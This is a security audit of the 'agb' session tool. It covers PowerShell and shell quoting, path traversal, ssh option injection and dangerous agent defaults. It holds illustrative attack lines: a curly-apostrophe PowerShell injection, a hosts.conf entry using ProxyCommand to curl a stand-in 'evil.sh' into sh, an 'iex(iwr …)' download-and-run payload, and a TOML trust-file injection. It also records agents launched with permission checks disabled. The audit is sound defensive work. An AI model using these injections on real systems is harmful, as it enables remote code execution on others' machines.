# Security and quality review — remote execution and the session layer

Scope: `src/sessions/` (`sys.zig`, `hosts.zig`, `local.zig`, `cli.zig`, `intent.zig`) and
`src/main.zig` — everything that turns a name, a path or a dictated sentence into a
command on this machine or on another one over ssh.

Threat model: the mesh is not a trust boundary the way the code assumed. `agb deploy`
rewrites `~/.config/work/hosts.conf` on every registered machine, so **one compromised
machine writes the registry of all the others**, and that registry decides what `ssh`
is invoked with. Dictated text reaches a remote PowerShell. Session names come from
whatever a pane prints as its title. Task names become directories under `$HOME` where
an agent runs with every permission skipped.

Regression tests live next to the code. `src/sessions/cli.zig` is already in the
`test_step` list of `build.zig`, and Zig runs the tests of every file it imports, so the
new tests in `sys.zig`, `hosts.zig` and `local.zig` all run under `zig build test` — no
`build.zig` change was needed.

---

## Shell and PowerShell quoting

### R1. A curly apostrophe closed the PowerShell quoting, so dictated text ran as code on Windows hosts
- **severity:** critical
- **where:** src/sessions/sys.zig:222 (`psQuoteRun`), src/sessions/sys.zig:232 (`psQuote`)
- **evidence:** Windows' sshd hands the command to PowerShell, so every argument crossing
  to an `msys` host is wrapped by `psQuote`, which doubled only ASCII `'`. PowerShell's
  tokenizer ends a single-quoted string on the typographic quotes too. Verified against
  pwsh 7: `Write-Output 'a’; Write-Output PWNED; ’'` prints `a` then `PWNED`, and U+2018,
  U+2019, U+201A and U+201B all terminate the string (U+2032 and U+FF07 do not). Deepgram
  runs with `smart_format`, which writes U+2019 into every dictated contraction, and that
  text reaches `remoteArgv` through `agb send <session> windows <text…>` and through the
  `--prompt` of `agb new … windows …`. A sentence containing `’; <command>; ’` executes
  `<command>` on the Windows machine as the ssh user. Nothing needs to be malformed for a
  user to hit it: an ordinary Portuguese sentence breaks the remote parse today.
- **fix:** `psQuote` doubles every character PowerShell reads as a closing single quote —
  ASCII `'` and the UTF-8 three-byte forms of U+2018..U+201B — leaving every other
  character, including U+2032 and U+FF07, exactly as it was.
- **status:** fixed
- **proof:** command: `zig build test 2>&1 | tail -n 200 && zig test --test-filter "curly apostrophe" src/sessions/sys.zig`

### R2. The tmux command for a `shell` session took `$SHELL` unquoted
- **severity:** low
- **where:** src/sessions/local.zig:289
- **evidence:** `agentCommand` returns a string tmux hands to `/bin/sh -c`. The `.shell`
  branch pasted `$SHELL` into it raw, so a shell path with a space (or anything else `sh`
  reads) became more than a program name.
- **fix:** the path goes through `sys.shQuote`, like the agent binaries in the same function.
- **status:** fixed
- **proof:** command: `grep -q 'try sys.shQuote(ctx, ctx.getenv("SHELL") orelse "/bin/sh")' src/sessions/local.zig`

### R3. A worktree path could write its own entry into Codex's trust file
- **severity:** medium
- **where:** src/sessions/local.zig:185 (`tomlQuote`), src/sessions/local.zig:203
- **evidence:** `trustCodex` wrote `[projects."<path>"]` into `~/.codex/config.toml` with
  the path unescaped. On Windows every path is backslashes, which TOML reads as escapes —
  `C:\dev\x` is an invalid escape that makes Codex reject its own configuration, so the
  auto-trust silently stopped working there. A directory whose name contains `"` closes
  the key, and `a"]\n[projects."/"]\ntrust_level = "trusted"` marks `/` as a trusted
  project for every later Codex run.
- **fix:** the path goes through `tomlQuote` (`"`, `\`, CR, LF, tab escaped) before it
  becomes a key.
- **status:** fixed
- **proof:** command: `zig test --test-filter "own Codex trust entry" src/sessions/local.zig`

### Checked, no finding
`shQuote` is correct POSIX single-quoting and `shJoin` uses it for every element.
The prompt reaches the agent as `"$(cat <quoted file>)"` — a command substitution inside
double quotes is not re-evaluated, so a dictated request cannot become a command. The
`$SHELL -lic` script in `intent.zig:219` and the key probe at `intent.zig:241` pass the
request through the environment (`"$AGB_TASK"`, `"$AGB_REQUEST"`) and never interpolate it
into the script text. `tmux()` and `tmuxHandOver()` on Windows build their bash line with
`shJoin`/`shQuote`. The conversation id interpolated into the adopt command
(`local.zig:706`) is constrained to a UUID by `isUuid` at all three of its sources.

---

## Names, paths and traversal

### R4. `..` was a valid task name, and `~/agents/..` is the home directory
- **severity:** high
- **where:** src/sessions/sys.zig:282 (`validSlug`), src/sessions/sys.zig:291 (`validRepo`)
- **evidence:** `validSlug` allowed `.`, so `.` and `..` passed. A task without a repo
  works in `~/agents/<task>`, and `agb new --no-repo --task .. …` — or `agb _run --detach ..`
  from any machine in the mesh — resolves to `$HOME`. The agent is then started there with
  `--dangerously-skip-permissions`, and `trustClaude` writes `$HOME` into
  `~/.claude.json` as a permanently trusted project, which outlives the session. A leading
  `-` also passed, and a task is a positional argument of `agb _run` on the far side.
  `validRepo` accepted `..` as a path segment for the same reason.
- **fix:** `validSlug` refuses a name that is only dots and a name starting with `-`;
  `validRepo` refuses a `..` segment and a leading `-`. `local.create` already gates every
  path on `validSlug`, local and over ssh alike.
- **status:** fixed
- **proof:** command: `zig test --test-filter "never a directory entry" src/sessions/sys.zig`

### R5. The adopted session took its name from a basename that could be `..` or empty
- **severity:** low
- **where:** src/sessions/local.zig:745
- **evidence:** `adoptDo` named the new tmux session after the basename of the stopped
  agent's working directory, sanitized character by character. `basename("/")` is `/`,
  which sanitized to `-`, and a process whose cwd ends in `..` gave a session called `..`;
  an empty result would have been passed to `tmux new-session -s ""`.
- **fix:** the sanitized basename is used only when it is a valid name; otherwise the
  session is named after the agent.
- **status:** fixed
- **proof:** command: `grep -q 'if (sys.validSlug(cleaned)) cleaned else a.agent' src/sessions/local.zig`

### R6. A spoken prompt was written into a world-listable directory
- **severity:** low
- **where:** src/sessions/local.zig:281
- **evidence:** the first instruction is written to `~/.cache/agent-belt/prompts/<task>.txt`
  because tmux caps a command at 16 KB. The file itself was already `0600`
  (`sys.writeFileAtomic`), but the directory was created with `createDirPath`, i.e. `0755`,
  so any other local user could list the task names of every session.
- **fix:** the directory is created with `sys.createPrivateDir` (`0700`, and it refuses a
  directory that is not the owner's alone), like every other place agb keeps private data.
- **status:** fixed
- **proof:** command: `grep -q 'sys.createPrivateDir(ctx.io, dir) catch {};' src/sessions/local.zig`

### Checked, no finding
`sessionSlug` reduces an agent's terminal title — which any program in the pane controls
through an OSC escape — to letters, digits and dashes, folds accents and truncates at 40
characters, and `syncName` refuses to rename onto a name that already exists. Task slugs
built by `slugFromWords` keep only alphanumerics. `claudeConversationExists` maps a path to
a Claude project key by replacing separators, and only reads. `resolveRepo` requires
`git rev-parse --show-toplevel` to succeed, so a repo argument names a real repository and
the worktree path is git's own canonical output.

---

## The registry and ssh

### R7. An entry in `hosts.conf` could be an ssh option instead of a machine
- **severity:** critical
- **where:** src/sessions/sys.zig:305 (`validSshTarget`), src/sessions/hosts.zig:82
- **evidence:** `hosts.load` accepted any second word as the ssh destination, and
  `remoteArgv`/`deployOne` place it in the argv of `ssh` and `scp` as-is. `ssh` has no
  `--`, so a destination beginning with `-` is read as an option: a line
  `host evil -oProxyCommand=curl\ evil.sh|sh posix` makes `agb ls` — which contacts every
  registered machine on a thread — run that command **on this machine**, before any
  connection. This is not only a hand-edited-file problem: `agb deploy` scp's a rendered
  registry over `~/.config/work/hosts.conf` on each target, so one compromised machine in
  the mesh owns every other machine's ssh invocation. `agb hosts add` and
  `agb hosts discover` (peer names and `~/.ssh/config` users) fed the same field unchecked,
  and `agb hosts self <name>` wrote its argument straight into a registry line, where a
  newline adds a `host` entry of its own.
- **fix:** `sys.validSshTarget` accepts only a destination made of name characters with at
  most one `@` and no leading `-` (and no `:`, which `scp` reads as a path separator).
  `hosts.load` drops an entry whose name or destination fails, counting them in
  `Registry.dropped`, which `agb hosts show` and `agb doctor` report; `hosts add`,
  `hosts discover` and `hosts self` refuse bad input at the door.
- **status:** fixed
- **proof:** command: `zig test --test-filter "cannot be an ssh option" src/sessions/sys.zig && zig test --test-filter "whatever wrote the file" src/sessions/hosts.zig`

### R8. The ssh user was cut out of the destination and pasted into a remote PowerShell command
- **severity:** high
- **where:** src/sessions/cli.zig:154 (`hostUser`), src/sessions/cli.zig:141, src/sessions/cli.zig:923
- **evidence:** three places took `h.target[0 .. indexOfScalar('@') orelse 0]`. With no `@`
  that is the **empty string**, and the code went on to use `C:\Users\\.local\bin\agb.exe`
  and to create `C:\Users\\.local\bin` on the far side. With a registry an attacker
  controls (R7), the user part was interpolated unquoted into the PowerShell script
  `deployOne` sends — `$b='C:\Users\<user>\.local\bin'; …` — so a destination like
  `a'; iex(iwr http://…); #@win` executes on the Windows machine during `agb deploy`, and
  into the remote command path in `remoteArgv` on every `agb ls`.
- **fix:** one `hostUser` helper returns `error.TargetWithoutUser` instead of an empty
  string, and R7 restricts the characters the user part can contain, so it is a bare name
  by the time it reaches a path or a PowerShell literal.
- **status:** fixed
- **proof:** command: `! grep -q "indexOfScalar(u8, h.target, '@') orelse 0" src/sessions/cli.zig && ! grep -q "indexOfScalar(u8, host.target, '@') orelse 0" src/sessions/cli.zig && grep -q 'fn hostUser' src/sessions/cli.zig`

### R9. `StrictHostKeyChecking=accept-new` trusts a machine's key on first contact
- **severity:** medium
- **where:** src/sessions/cli.zig:138, src/sessions/cli.zig:912
- **evidence:** every `ssh` and `scp` call sets `accept-new`, so the first connection to a
  registered machine accepts whatever host key answers. Someone who can answer for a
  tailnet name before the first contact becomes that machine, and `agb deploy` would ship
  the binary and the registry to them.
- **fix:** not changed. `agb hosts discover` registers every tailnet machine at once and
  `agb deploy` installs to a machine that has never been contacted; with
  `StrictHostKeyChecking=yes` both would fail until the user seeded `known_hosts` by hand
  for each machine, which is the stated setup path in `README`/`GETTING-STARTED`. The
  setting keeps the half that matters most after first contact — a **changed** key is
  still refused, which `yes` and `accept-new` handle identically — and the transport is a
  tailnet, not the open internet. Recorded so the trade-off is explicit rather than
  accidental.
- **status:** accepted
- **proof:** command: `grep -q 'StrictHostKeyChecking=accept-new' src/sessions/cli.zig`

---

## tmux targets and the protocol

### R10. A session name with `:` aimed the protocol verbs at a different session
- **severity:** medium
- **where:** src/sessions/sys.zig:318 (`validTarget`), src/sessions/local.zig:384, :406, :70
- **evidence:** every target was built as `"={name}"` or `"={name}:"`, and tmux splits a
  target at the first `:` into `session:window.pane`. `agb stop 'coreum:1'` — or `_stop`
  from any machine in the mesh — resolved to `=coreum` and killed the session **coreum**,
  not the one named. `_send` typed into the wrong session the same way. A session whose
  name contains `:` is not addressable by these tools at all, so nothing could be reached
  correctly; the only outcome was reaching something else.
- **fix:** `sys.validTarget` refuses a name holding `:`, CR, LF or NUL, and `hasSession`,
  `paneTarget` and `stop` check it before building a target. `local.create` surfaces it as
  `error.InvalidTarget` with a message rather than silently aiming elsewhere.
- **status:** fixed
- **proof:** command: `zig test --test-filter "tmux would read as another session" src/sessions/sys.zig`

### R11. A session name containing `|` shifted every column of the machine-to-machine listing
- **severity:** medium
- **where:** src/sessions/local.zig:606 (`field`)
- **evidence:** `agb _ls-raw` answers with `name|windows|created|attached|agent|path` per
  line, and `cli.collect` splits on `|`. tmux allows `|` in a session name and a path can
  hold anything, so one session created by hand as `tmux new -s 'a|b'` shifts every later
  field for every machine that lists it: the table shows the wrong agent, the wrong age and
  the wrong path, and `path` (parsed with `f.rest()`) absorbs the remainder. A name with a
  newline split one session into two rows.
- **fix:** the name and the path go through `field`, which replaces `|`, CR and LF with a
  space; the other columns are tmux-generated numbers and flags.
- **status:** fixed
- **proof:** command: `zig test --test-filter "keeps its columns" src/sessions/local.zig`

### Checked, no finding
A closed client never kills the session at its origin: `attach` and `tm` hand the terminal
to `tmux attach`/`switch-client`, and `-d` detaches other clients rather than ending them.
The only `kill-session` is the explicit `stop` verb (`local.zig:407`). `adoptDo` does send
`SIGTERM` and then `SIGKILL`, but only to a pid it re-found in `adoptList` — the loose-agent
scan — so `_adopt-do <pid>` from another machine cannot name an arbitrary process, and the
CLI asks for confirmation first. `send` uses `send-keys -l --`, so the text is typed
literally and cannot be read as tmux key names or options.

---

## Dangerous defaults

### R12. Agents start with permission checks disabled and the worktree pre-trusted
- **severity:** high
- **where:** src/sessions/local.zig:249, :256, :706 and src/sessions/local.zig:160 (`trustClaude`), :196 (`trustCodex`)
- **evidence:** `claude` is started with `--dangerously-skip-permissions`, `codex` with
  `--dangerously-bypass-approvals-and-sandbox`, and before either runs, agb writes
  `hasTrustDialogAccepted` into `~/.claude.json` and a `trust_level = "trusted"` project
  into Codex's `config.toml` for the working directory. Any machine in the mesh can create
  such a session here over ssh (`agb _run`), and it keeps running after the caller
  disconnects.
- **fix:** not changed. This is the product: `docs/VISION.md` and the `agb new` help
  describe autonomous sessions on other machines, and an agent that stops at a trust dialog
  waiting for Enter defeats the whole workflow — the comment above `trustClaude` states it.
  The escape hatches exist and are respected (`WORK_NO_AUTOTRUST=1` skips both trust
  writes, `WORK_NEW=1` forces a new conversation), each trust file is backed up to
  `<file>.pre-agb.bak` before the first change, and the reach of a session is now bounded:
  R4 stops a task name from placing one of these agents in `$HOME`, and R3 stops a path
  from trusting a directory nobody chose. The remaining exposure is the mesh itself — ssh
  access to the account already implies code execution, so `_run` grants nothing that an
  `ssh` login does not.
- **status:** accepted
- **proof:** command: `grep -q 'WORK_NO_AUTOTRUST' src/sessions/local.zig && grep -q 'dangerously-skip-permissions' src/sessions/local.zig`

### Checked, no finding
`agb _run`, `_send`, `_peek`, `_stop`, `_adopt-do`, `_intent` and `_summary` are reachable
only by a process that already authenticated over ssh to this account. None of them widens
what that process can do beyond what the account can do, once R1, R4, R7, R8, R10 and R11
close the paths that turned their arguments into something other than data. `_peek`'s line
count is parsed as an integer and `_send` requires a session and a text. `parseRun` reads
`--agent` through `parseAgent`, so only `claude`, `codex` or `shell` can be started.

---

## Verification

```
zig build -Doptimize=ReleaseSafe
zig build test
zig build -Dtarget=x86_64-linux-musl -Doptimize=ReleaseSafe
zig build -Dtarget=x86_64-windows-gnu -Doptimize=ReleaseSafe
bash -n install.sh && for f in scripts/*.sh githooks/*; do bash -n "$f" || exit 1; done
sentrux check . && sentrux gate .
```
